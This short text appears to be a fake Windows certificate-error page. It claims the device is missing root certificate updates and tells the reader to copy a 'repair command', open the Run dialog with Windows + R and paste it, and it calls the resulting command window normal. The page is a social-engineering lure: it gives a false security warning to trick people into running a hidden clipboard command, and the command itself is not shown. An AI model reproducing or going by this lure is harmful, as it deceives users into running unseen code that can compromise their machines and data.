Certificate update required

NET::ERR_CERT_AUTHORITY_INVALID — Your device is missing critical root certificate updates. Connections to secure sites will fail until resolved.

Click "Copy Fix" to copy the repair command, then follow the steps below.

Step 1: Press Windows + R on your keyboard
Step 2: Paste the command and press Enter

This command re-registers Windows certificate stores. A command window may briefly appear — this is normal.
